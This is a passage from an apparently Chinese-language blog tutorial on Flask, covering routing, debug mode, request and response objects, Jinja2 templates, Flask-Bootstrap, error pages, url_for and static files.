<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$env</span>:FLASK_APP=<span class="string">".\hello.py"</span></span><br><span class="line">flask run</span><br></pre></td></tr></table></figure>
<p>默认的端口是5000，此时再访问<code>http:localhost:5000/</code>即可</p>
<h5 id="2-5-动态路由"><a href="#2-5-动态路由" class="headerlink" title="2.5 动态路由"></a>2.5 动态路由</h5><p>在hello.py的基础上增加一个动态路由：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'&amp;lt;h1&gt;Hello World!&amp;lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/user/&amp;lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">users</span><span class="params">(name)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'&amp;lt;h1&gt;Hello &#123;&#125;&amp;lt;/h1&gt;'</span>.format(name)</span><br></pre></td></tr></table></figure>
<p>此时访问<a href="http://localhost:5000/user/Lethe，则会显示Hello" target="_blank" rel="noopener">http://localhost:5000/user/Lethe，则会显示Hello</a> Lethe</p>
<h5 id="2-6-调试模式"><a href="#2-6-调试模式" class="headerlink" title="2.6 调试模式"></a>2.6 调试模式</h5><p>调试模式默认禁用，若想启用，在执行 flask run 命令之前设定环境遍历 FLASK_DEBUG=1即可。</p>
<p>千万不要在生产服务器中启用调试模式。</p>
<h5 id="2-7-命令行选项"><a href="#2-7-命令行选项" class="headerlink" title="2.7 命令行选项"></a>2.7 命令行选项</h5><p>（1）<code>flask shell</code> 命令在应用的上下文中打开一个 Python shell 会话。在这个会话中可以运行维护任务或测试，也可以调试问题。</p>
<p>（2）flask run 命令我们已经用过，它的作用是在 Web开发服务器中运行应用，可以使用 flask run –help查看该命令的具体参数使用。</p>
<p>其中 <code>--host</code>参数可以告诉Web服务器在哪个网络接口上监听客户端发来的连接。默认情况下，Flask 的 Web 开发服务器监听 localhost 上的连接。要写监听公网上的连接，则需要如下启动命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flask run --host 0.0.0.0</span><br></pre></td></tr></table></figure>
<h5 id="2-8-请求-响应循环"><a href="#2-8-请求-响应循环" class="headerlink" title="2.8 请求-响应循环"></a>2.8 请求-响应循环</h5><h6 id="2-8-1-应用和请求上下文"><a href="#2-8-1-应用和请求上下文" class="headerlink" title="2.8.1 应用和请求上下文"></a>2.8.1 应用和请求上下文</h6><p>在 Flask 中有两种上下文：应用上下文 和请求上下文。</p>
<p>应用上下文包括：</p>
<ul>
<li>current_app：当前应用的应用实例</li>
<li>g：处理请求时用作临时存储的对象，每次请求都会重设这个<br>变量</li>
</ul>
<p>请求上下文包括：</p>
<ul>
<li>request：请求对象，封装了客户端发出的 HTTP 请求中的内容</li>
<li>session：用户会话，值为一个字典，存储请求之间需要“记住”的值</li>
</ul>
<p>Flask 在分派请求之前激活（或推送 ）应用和请求上下文，请求处理完成后再将其删除。应用上下文被推送后，就可以在当前线程中使用current_app 和 g 变量。类似地，请求上下文被推送后，就可以使用request 和 session 变量。如果使用这些变量时没有激活应用上下文或请求上下文，就会导致错误。</p>
<p>由于这一部分对于初学者来说比较难理解，推荐阅读此文章：<a href="http://www.bjhee.com/flask-ad1.html" target="_blank" rel="noopener">http://www.bjhee.com/flask-ad1.html</a></p>
<h6 id="2-8-2-请求对象"><a href="#2-8-2-请求对象" class="headerlink" title="2.8.2 请求对象"></a>2.8.2 请求对象</h6><p>Flask 通过上下文变量 request 对外开放请求对象，此对象包含客户端发送的HTTP请求的全部信息。</p>
<p>Flask请求对象常用属性和方法如下：</p>
<ul>
<li>form：一个字典，存储请求提交的所有表单字段</li>
<li>args：一个字典，存储通过 URL 查询字符串传递的所有参数</li>
<li>values：一个字典， form 和 args 的合集</li>
<li>cookies： 一个字典，存储请求的所有 cookie</li>
<li>headers ：一个字典，存储请求的所有 HTTP 首部</li>
<li>files： 一个字典，存储请求上传的所有文件</li>
<li>get_data()： 返回请求主体缓冲的数据</li>
<li>get_json()： 返回一个 Python 字典，包含解析请求主体后得到的 JSON</li>
<li>blueprint：处理请求的 Flask 蓝本的名称；蓝本在第 7 章介绍</li>
<li>endpoint：处理请求的 Flask 端点的名称；Flask 把视图函数的名称用作路由端点的名称</li>
<li>method： HTTP 请求方法，例如 GET 或 POST</li>
<li>scheme： URL 方案（ http 或 https ）</li>
<li>is_secure()： 通过安全的连接（HTTPS）发送请求时返回 True</li>
<li>host： 请求定义的主机名，如果客户端定义了端口号，还包括端口号</li>
<li>path： URL 的路径部分</li>
<li>query_string： URL 的查询字符串部分，返回原始二进制值</li>
<li>full_path： URL 的路径和查询字符串部分</li>
<li>url： 客户端请求的完整 URL</li>
<li>base_url： 同 url ，但没有查询字符串部分</li>
<li>remote_addr： 客户端的 IP 地址</li>
<li>environ： 请求的原始 WSGI 环境字典</li>
</ul>
<h6 id="2-8-3-请求钩子"><a href="#2-8-3-请求钩子" class="headerlink" title="2.8.3 请求钩子"></a>2.8.3 请求钩子</h6><p>请求钩子通过装饰器实现，可以将某个函数装饰为一个请求钩子，在请求开始或结束时自动调用被修饰的函数内容。</p>
<p>Flask 支持以下 4 种钩子：</p>
<ul>
<li>before_request：注册一个函数，在每次请求之前运行。</li>
<li>before_first_request：注册一个函数，只在处理第一个请求之前运行。可以通过这个钩子添加服务器初始化任务。</li>
<li>after_request：注册一个函数，如果没有未处理的异常抛出，在每次请求之后运行。</li>
<li>teardown_request：注册一个函数，即使有未处理的异常抛出，也在每次请求之后运行。</li>
</ul>
<h6 id="2-8-4-响应"><a href="#2-8-4-响应" class="headerlink" title="2.8.4 响应"></a>2.8.4 响应</h6><p>（1）Flask 调用视图函数后，会将其返回值作为响应的内容。</p>
<p>可以通过设置返回值的第二个参数来返回不同的状态码，如返回400：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'&amp;lt;h1&gt;Bad Request&amp;lt;/h1&gt;'</span>, <span class="number">400</span></span><br></pre></td></tr></table></figure>
<p>视图函数返回的响应还可接受第三个参数，这是一个由 HTTP 响应首部组成的字典。</p>
<p>（2）除此之外，还可以返回一个响应对象。make_response() 函数接收与返回值一样的参数，然后返回一个响应对象。</p>
<p>这么做的目的是可以通过此返回对象调用各个方法，进一步设置相应。</p>
<p>如下创建一个相应对象，然后设置cookie：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	response = make_response(<span class="string">'&amp;lt;h1&gt;This document carries a cookie!&amp;lt;h1/&gt;'</span>)</span><br><span class="line">	response.set_cookie(<span class="string">'answer'</span>, <span class="string">'42'</span>)</span><br><span class="line">	<span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
<p>这样在访问时，返回的同时也会设置一个cookie。</p>
<p>Flask响应对象常用的属性和方法如下：</p>
<ul>
<li>status_code： HTTP 数字状态码</li>
<li>headers：一个类似字典的对象，包含随响应发送的所有首部</li>
<li>set_cookie()： 为响应添加一个 cookie</li>
<li>delete_cookie()： 删除一个 cookie</li>
<li>content_length： 响应主体的长度</li>
<li>content_type： 响应主体的媒体类型</li>
<li>set_data()： 使用字符串或字节值设定响应</li>
<li>get_data()： 获取响应主体</li>
</ul>
<p>（3）重定向<br>如果要使用重定向(302)，在Flask中提供了 redirect()函数，用于生成重定向响应：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">'http://www.baidu.com'</span>)</span><br></pre></td></tr></table></figure>
<p>（4）处理错误<br>还有一种特殊的响应由 abort() 函数生成，用于处理错误，其不会把控制权交还给调用它的函数，而是抛出异常。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/answer/&amp;lt;int:id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user</span><span class="params">(id)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> id != <span class="number">1</span>:</span><br><span class="line">		abort(<span class="number">404</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">'&amp;lt;h1&gt;answer=1&amp;lt;/h1&gt;'</span></span><br></pre></td></tr></table></figure>
<p>上例访问 <code>/user/1</code>时会返回<code>answer=1</code>，若<code>&amp;lt;id&gt;</code>不1，则返回404。</p>
<p>&lt;br&gt;</p>
<h1 id="0x02-模板"><a href="#0x02-模板" class="headerlink" title="0x02 模板"></a>0x02 模板</h1><h3 id="一、Jinja2模板引擎"><a href="#一、Jinja2模板引擎" class="headerlink" title="一、Jinja2模板引擎"></a>一、Jinja2模板引擎</h3><h5 id="1-1-变量"><a href="#1-1-变量" class="headerlink" title="1.1 变量"></a>1.1 变量</h5><p>默认情况下，Flask 在应用目录中的 template 子目录中寻找模板。</p>
<p>在模板中使用 {{}} 结构来表示一个变量，是一种特殊的占位符，告诉模板引擎这个位置的值从渲染模板时使用的数据中获取。</p>
<p>index.html：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;lt;h1&gt;Hello World!&amp;lt;/h1&gt;</span><br></pre></td></tr></table></figure></p>
<p>user.html：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;lt;h1&gt;Hello, &#123;&#123; name &#125;&#125;!&amp;lt;/h1&gt;</span><br></pre></td></tr></table></figure>
<p>hello.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    	<span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/user/&amp;lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(name)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">'user.html'</span>, name=name)</span><br></pre></td></tr></table></figure>
<p>Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。下面是在模板中使用变量的一些示例:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;lt;p&gt;A value from a dictionary: &#123;&#123; mydict['key'] &#125;&#125;.&amp;lt;/p&gt;</span><br><span class="line">&amp;lt;p&gt;A value from a list: &#123;&#123; mylist[3] &#125;&#125;.&amp;lt;/p&gt;</span><br><span class="line">&amp;lt;p&gt;A value from a list, with a variable index: &#123;&#123; mylist[myintvar] &#125;&#125;.&amp;lt;/p&gt;</span><br><span class="line">&amp;lt;p&gt;A value from an object's method: &#123;&#123; myobj.somemethod() &#125;&#125;.&amp;lt;/p&gt;</span><br></pre></td></tr></table></figure>
<p>变量的值可以使用过滤器修改。过滤器添加在变量名之后，二者之间以竖线分隔。</p>
<p>Jinjia2变量过滤器：</p>
<table>
<thead>
<tr>
<th>过滤器名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>safe</td>
<td>渲染值时不转义</td>
</tr>
<tr>
<td>capitalize</td>
<td>把值的首字母转换成大写，其他字母转换成小写</td>
</tr>
<tr>
<td>lower</td>
<td>把值转换成小写形式</td>
</tr>
<tr>
<td>upper</td>
<td>把值转换成大写形式</td>
</tr>
<tr>
<td>title</td>
<td>把值中每个单词的首字母都转换成大写</td>
</tr>
<tr>
<td>trim</td>
<td>把值的首尾空格删掉</td>
</tr>
<tr>
<td>striptags</td>
<td>渲染之前把值中所有的 HTML 标签都删掉</td>
</tr>
</tbody>
</table>
<h5 id="1-2-控制结构"><a href="#1-2-控制结构" class="headerlink" title="1.2 控制结构"></a>1.2 控制结构</h5><p>（1）条件判断语句</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% if user %&#125;</span><br><span class="line">	Hello, &#123;&#123; user &#125;&#125;!</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">	Hello, Stranger!</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<p>（2）for循环语句</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;lt;ul&gt;</span><br><span class="line">	&#123;% for comment in comments %&#125;</span><br><span class="line">		&amp;lt;li&gt;&#123;&#123; comment &#125;&#125;&amp;lt;/li&gt;</span><br><span class="line">	&#123;% endfor %&#125;</span><br><span class="line">&amp;lt;/ul&gt;</span><br></pre></td></tr></table></figure>
<p>（3）宏</p>
<p>Jinja2支持宏，类似于函数的作用，例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% macro render_comment(comment) %&#125;</span><br><span class="line">&amp;lt;li&gt;&#123;&#123; comment &#125;&#125;&amp;lt;/li&gt;</span><br><span class="line">&#123;% endmacro %&#125;</span><br><span class="line">&amp;lt;ul&gt;</span><br><span class="line"></span><br><span class="line">&#123;% for comment in comments %&#125;</span><br><span class="line">&#123;&#123; render_comment(comment) &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&amp;lt;/ul&gt;</span><br></pre></td></tr></table></figure>
<p>还可以把宏保存在单独文件中，然后重复使用，如</p>
<p>macors.html：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% macro render_comment(comment) %&#125;</span><br><span class="line">&amp;lt;li&gt;&#123;&#123; comment &#125;&#125;&amp;lt;/li&gt;</span><br><span class="line">&#123;% endmacro %&#125;</span><br><span class="line">&amp;lt;ul&gt;</span><br></pre></td></tr></table></figure>
<p>然后再需要用到宏的模板中使用 <code>import</code> 语句导入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% import 'macros.html' as macros %&#125;</span><br><span class="line">&amp;lt;ul&gt;</span><br><span class="line">	&#123;% for comment in comments %&#125;</span><br><span class="line">		&#123;&#123; macros.render_comment(comment) &#125;&#125;</span><br><span class="line">	&#123;% endfor %&#125;</span><br><span class="line">&amp;lt;/ul&gt;</span><br></pre></td></tr></table></figure>
<p>（4）模板</p>
<p>需要在多处重复使用的模板代码片段可以写入单独的文件，再引入所有模板中，以以避免重复：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% include 'common.html' %&#125;</span><br></pre></td></tr></table></figure>
<p>模板也是可以<strong>继承</strong>的，先创建一个基模板 <code>base.html</code> 如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&amp;lt;html&gt;</span><br><span class="line">    &amp;lt;head&gt;</span><br><span class="line">        &#123;% block head %&#125;</span><br><span class="line">        &amp;lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125; - My Application&amp;lt;/title&gt;</span><br><span class="line">        &#123;% endblock%&#125;</span><br><span class="line">    &amp;lt;/head&gt;</span><br><span class="line">&amp;lt;body&gt;</span><br><span class="line">    &#123;% block body %&#125;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line">&amp;lt;/body&gt;</span><br><span class="line">&amp;lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>上面 <code>block</code> 和<code>endblock</code> 定义的区块中内容可以在衍生模板中覆盖，如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line">&#123;% block title%&#125;Index&#123;% endblock %&#125;</span><br><span class="line">&#123;% block head %&#125;</span><br><span class="line">    &#123;&#123; super() &#125;&#125;</span><br><span class="line">    &amp;lt;style&gt;</span><br><span class="line">    &amp;lt;/style&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">&amp;lt;h1&gt;Hello, World!&amp;lt;/h1&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p><code>extends</code> 声明此模板衍生自 <code>base.html</code>，然后将基模板中定义的3个区块重新覆盖，在衍生模板的区块里可以调用 <code>super()</code>来使用基模板中的内容。</p>
<p>&lt;br&gt;</p>
<h3 id="二、使用Flask-Bootstrap集成Bootstrap"><a href="#二、使用Flask-Bootstrap集成Bootstrap" class="headerlink" title="二、使用Flask-Bootstrap集成Bootstrap"></a>二、使用Flask-Bootstrap集成Bootstrap</h3><p>使用前需要先初始化Flask-Bootstrap，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br></pre></td></tr></table></figure>
<p>然后可以直接继承提供的 <code>bootstrap/base.html</code> 模板，其是一个包含了Bootstrap 文件和一般结构的基模板，衍生模板 <code>user.html</code>如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "bootstrap/base.html" %&#125;</span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line">&#123;% block navbar %&#125;</span><br><span class="line">&amp;lt;div class="navbar navbar-inverse" role="navigation"&gt;</span><br><span class="line">    &amp;lt;div class="container"&gt;</span><br><span class="line">        &amp;lt;div class="navbar-header"&gt;</span><br><span class="line">            &amp;lt;button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse"&gt;</span><br><span class="line">                &amp;lt;span class="sr-only"&gt;Toggle navigation&amp;lt;/span&gt;</span><br><span class="line">                &amp;lt;span class="icon-bar"&gt;&amp;lt;/span&gt;</span><br><span class="line">                &amp;lt;span class="icon-bar"&gt;&amp;lt;/span&gt;</span><br><span class="line">                &amp;lt;span class="icon-bar"&gt;&amp;lt;/span&gt;</span><br><span class="line">            &amp;lt;/button&gt;</span><br><span class="line">            &amp;lt;a class="navbar-brand" href="/"&gt;Flasky&amp;lt;/a&gt;</span><br><span class="line">        &amp;lt;/div&gt;</span><br><span class="line">        &amp;lt;div class="navbar-collapse collapse"&gt;</span><br><span class="line">            &amp;lt;ul class="nav navbar-nav"&gt;</span><br><span class="line">                &amp;lt;li&gt;&amp;lt;a href="/"&gt;Home&amp;lt;/a&gt;&amp;lt;/li&gt;</span><br><span class="line">            &amp;lt;/ul&gt;</span><br><span class="line">        &amp;lt;/div&gt;</span><br><span class="line">    &amp;lt;/div&gt;</span><br><span class="line">&amp;lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">&amp;lt;div class="container"&gt;</span><br><span class="line">    &amp;lt;div class="page-header"&gt;</span><br><span class="line">        &amp;lt;h1&gt;Hello, &#123;&#123; name &#125;&#125;!&amp;lt;/h1&gt;</span><br><span class="line">    &amp;lt;/div&gt;</span><br><span class="line">&amp;lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>完整hello.py如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    	<span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/user/&amp;lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(name)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">'user.html'</span>, name=name)</span><br></pre></td></tr></table></figure>
<p>Flask-Bootstrap基模板中定义的区块如下：</p>
<table>
<thead>
<tr>
<th>区块名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>doc</td>
<td>整个 HTML 文档</td>
</tr>
<tr>
<td>html_attribs</td>
<td>\&lt;html> 标签的属性</td>
</tr>
<tr>
<td>html</td>
<td>\&lt;html> 标签中的内容</td>
</tr>
<tr>
<td>head</td>
<td>\&lt;head> 标签中的内容</td>
</tr>
<tr>
<td>title</td>
<td>\&lt;title> 标签中的内容</td>
</tr>
<tr>
<td>metas</td>
<td>一组 \&lt;meta> 标签</td>
</tr>
<tr>
<td>styles</td>
<td>CSS 声明</td>
</tr>
<tr>
<td>body_attribs</td>
<td>\&lt;body> 标签的属性</td>
</tr>
<tr>
<td>body</td>
<td>\&lt;body> 标签中的内容</td>
</tr>
<tr>
<td>navbar</td>
<td>用户定义的导航栏</td>
</tr>
<tr>
<td>content</td>
<td>用户定义的页面内容</td>
</tr>
<tr>
<td>scripts</td>
<td>文档底部的 JavaScript 声明</td>
</tr>
</tbody>
</table>
<p>若要在衍生模块中添加新的JavaScript文件，为了防止覆盖掉原有的引入Bootstrap的内容，需要使用 <code>super()</code> 函数：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% block scripts %&#125;</span><br><span class="line">&#123;&#123; super() &#125;&#125;</span><br><span class="line">&amp;lt;script type="text/javascript" src="my-script.js"&gt;&amp;lt;/script&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>&lt;br&gt;</p>
<h3 id="三、自定义错误页面"><a href="#三、自定义错误页面" class="headerlink" title="三、自定义错误页面"></a>三、自定义错误页面</h3><p>通常的错误页面有如下两种：</p>
<ul>
<li>404：客户端请求未知页面或路由时显示</li>
<li>500：有未处理的异常时显示</li>
</ul>
<p>使用 <code>app.errorhandler</code> 装饰器为这两个错误提供自定义的处理函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pate_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">'404.html'</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(500)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">internal_server_error</span><span class="params">(e)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">'500.html'</span>), <span class="number">500</span></span><br></pre></td></tr></table></figure>
<p>为了减少代码重复，我们可以在上面的基础上改进一下 <code>base.html</code>，使其成为继承了 <code>bootstrap/base.html</code> 的二级基模板，也可以被其他模板继承。</p>
<p>二级模板 templates/base.html：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "bootstrap/base.html" %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block navbar %&#125;</span><br><span class="line">&amp;lt;div class="navbar navbar-inverse" role="navigation"&gt;</span><br><span class="line">    &amp;lt;div class="container"&gt;</span><br><span class="line">        &amp;lt;div class="navbar-header"&gt;</span><br><span class="line">            &amp;lt;button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse"&gt;</span><br><span class="line">                &amp;lt;span class="sr-only"&gt;Toggle navigation&amp;lt;/span&gt;</span><br><span class="line">                &amp;lt;span class="icon-bar"&gt;&amp;lt;/span&gt;</span><br><span class="line">                &amp;lt;span class="icon-bar"&gt;&amp;lt;/span&gt;</span><br><span class="line">                &amp;lt;span class="icon-bar"&gt;&amp;lt;/span&gt;</span><br><span class="line">            &amp;lt;/button&gt;</span><br><span class="line">            &amp;lt;a class="navbar-brand" href="/"&gt;Flasky&amp;lt;/a&gt;</span><br><span class="line">        &amp;lt;/div&gt;</span><br><span class="line">        &amp;lt;div class="navbar-collapse collapse"&gt;</span><br><span class="line">            &amp;lt;ul class="nav navbar-nav"&gt;</span><br><span class="line">                &amp;lt;li&gt;&amp;lt;a href="/"&gt;Home&amp;lt;/a&gt;&amp;lt;/li&gt;</span><br><span class="line">            &amp;lt;/ul&gt;</span><br><span class="line">        &amp;lt;/div&gt;</span><br><span class="line">    &amp;lt;/div&gt;</span><br><span class="line">&amp;lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">&amp;lt;div class="container"&gt;</span><br><span class="line">    &#123;% block page_content %&#125;&#123;% endblock %&#125;</span><br><span class="line">&amp;lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>这样，应用中的模板继承自这个模板即可。</p>
<p>templates/404.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky - Page Not Found&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line">&amp;lt;div class="page-header"&gt;</span><br><span class="line">    &amp;lt;h1&gt;Not Found&amp;lt;/h1&gt;</span><br><span class="line">&amp;lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>上面的 user.html 也可以继承改模板来简化：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line">&amp;lt;div class="page-header"&gt;</span><br><span class="line">    &amp;lt;h1&gt;Hello, &#123;&#123; name &#125;&#125;!&amp;lt;/h1&gt;</span><br><span class="line">&amp;lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>&lt;br&gt;</p>
<h3 id="四、链接"><a href="#四、链接" class="headerlink" title="四、链接"></a>四、链接</h3><p>有时需要用动态路由链接多个不同的页面，此时就可以使用 <code>url_for()</code> 辅助函数，它使用应用的 URL 映射中保存的信息生成URL。</p>
<p>用法如下：</p>
<p>（1）以视图名为参数，返回对应的URL</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for(<span class="string">'index'</span>)</span><br></pre></td></tr></table></figure>
<p>返回根URL <code>/</code></p>
<p>（2）使用参数 <code>_external</code> 可返回绝对地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for(<span class="string">'index'</span>, _external=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>返回绝对地址 <code>http://localhost:5000/</code></p>
<p>（3）生成动态URL，将动态部分作为关键词参数传入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for(<span class="string">'user'</span>, name=<span class="string">'john'</span>, _external=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>返回结果是 <code>http://localhost:5000/user/john</code></p>
<p>（4）还可以添加非动态参数到查询字符串中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for(<span class="string">'user'</span>, name=<span class="string">'john'</span>, pate=<span class="number">2</span>, version=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>返回结果是 <code>/user/john?page=2&amp;version=1</code></p>
<p>&lt;br&gt;</p>
<h3 id="五、静态文件"><a href="#五、静态文件" class="headerlink" title="五、静态文件"></a>五、静态文件</h3><p>Flask路由中有一个特殊路由 static 路由：<code>/static/&amp;lt;filename&gt;</code><br>例如调用：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for(<span class="string">'static'</span>, filename=<span class="string">'css/styles.css'</span>, _external=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
<p>返回的结果是 <code>http://localhost:5000/static/css/styles.css</code></p>
<p>Flask默认在根目录中名为 static 的子目录中寻找静态文件。</p>
<p>下例说明了在应用的基模板中引入 favicon.ico 图标：</p>
<p>templates/base.html</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% block head %&#125;</span><br><span class="line">&#123;&#123; super() &#125;&#125;</span><br><span class="line">&amp;lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"&#123;&#123; url_for('static', filename='favicon.ico') &#125;&#125;"</span>, type=<span class="string">"image/x-icon"</span>&gt;</span><br><span class="line">&amp;lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"&#123;&#123; url_for('static', filename='favicon.ico') &#125;&#125;"</span>, type=<span class="string">"image/x-icon"</span>&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>&lt;br&gt;</p>
